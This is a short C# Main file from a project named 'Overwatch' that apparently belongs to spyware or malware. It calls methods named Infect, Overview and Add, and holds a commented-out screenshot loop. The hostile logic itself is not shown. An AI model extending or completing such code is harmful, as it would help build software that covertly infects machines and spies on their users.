﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();

        static void Main(string[] args)
        {
            try
            {
                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                cReceiveInformation info = new cReceiveInformation();
                info.Overview();
                info.Add();/*
                while (true)
                {
                    //info.ScreenShoot();
                    
                    System.Threading.Thread.Sleep(150);
                }
                */
            }
            catch (Exception ex){ Log.Write(ex.Message, true);}
        }
    }
}
